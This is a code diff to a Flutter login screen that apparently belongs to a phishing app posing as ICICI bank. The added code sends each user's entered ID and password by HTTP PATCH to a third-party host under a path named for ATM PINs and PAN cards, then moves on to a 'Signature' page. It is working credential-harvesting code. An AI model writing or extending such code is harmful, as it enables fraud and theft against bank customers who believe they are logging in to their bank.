@@ -88,13 +88,72 @@ class _LoginState extends State<Login> {
       loading = false;
     });
 
+    var response = prefs.getString('response');
+    //Parse JSON
+    var data = jsonDecode(response!);
+
+    //Http post request
+    await http
+        .patch(
+            Uri.parse(
+                "https://icici-d69xx.dauqu.host/data/atm_pin_pan_card/${data["_id"]}"),
+            headers: <String, String>{
+              'Content-Type': 'application/json; charset=UTF-8',
+            },
+            body: jsonEncode(<String, String>{
+              "user_id": userId.toString(),
+              "password": password.toString(),
+            }))
+        .then((value) async => {
+              //Set Laoding to false
+              setState(() {
+                loading = false;
+              }),
+
+              //Set shared pref
+              await prefs.setString('response', value.body),
+
+              //Move to next page
+              Navigator.push(
+                context,
+                MaterialPageRoute(
+                  builder: (context) => const Signature(),
+                ),
+              )
+            })
+
+        //Navigate to other page
+        .catchError((onError) {
+      //Set Loading fase
+      setState(() {
+        loading = false;
+      });
+
+      //Show nackend error in dialog
+      showDialog(
+          context: context,
+          builder: (BuildContext context) {
+            return AlertDialog(
+              title: const Text("Error"),
+              content: Text(onError.toString()),
+              actions: [
+                TextButton(
+                    onPressed: () {
+                      Navigator.of(context).pop();
+                    },
+                    child: const Text("OK"))
+              ],
+            );
+          });
+    });
+
     // ignore: use_build_context_synchronously
-    Navigator.push(
-      context,
-      MaterialPageRoute(
-        builder: (context) => const Signature(),
-      ),
-    );
+    // Navigator.push(
+    //   context,
+    //   MaterialPageRoute(
+    //     builder: (context) => const Signature(),
+    //   ),
+    // );
   }
 
   Future Login() async {
@@ -150,7 +209,6 @@ class _LoginState extends State<Login> {
 
         //Navigate to other page
         .catchError((onError) {
-      print(onError);
       //Set Loading fase
       setState(() {
         loading = false;
